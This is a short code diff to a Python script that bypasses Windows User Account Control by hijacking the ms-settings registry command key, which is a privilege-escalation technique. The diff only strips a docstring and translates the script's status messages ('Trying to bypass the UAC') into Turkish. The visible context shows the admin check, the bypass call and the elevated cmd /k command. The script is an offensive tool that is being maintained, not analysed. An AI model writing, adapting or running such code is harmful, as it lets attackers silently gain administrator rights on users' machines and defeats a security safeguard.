@@ -10,10 +10,6 @@ REG_PATH              = r'Software\Classes\ms-settings\shell\open\command'
 DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
 
 def is_running_as_admin():
-    '''
-    Checks if the script is running with administrative privileges.
-    Returns True if is running as admin, False otherwise.
-    '''    
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
@@ -43,8 +39,8 @@ def bypass_uac(cmd):
 
 def execute(command):        
     if not is_running_as_admin():
-        print('[!] The script is NOT running with administrative privileges')
-        print('[+] Trying to bypass the UAC')
+        print('[!] Admin yetkilerine yükseltiliyor...')
+        print('[+] UAC BYPASS EDİLMEYE ÇALIŞILIYOR...')
         try:                
             cmd = '{} /k {}'.format(CMD, command)
             bypass_uac(cmd)                
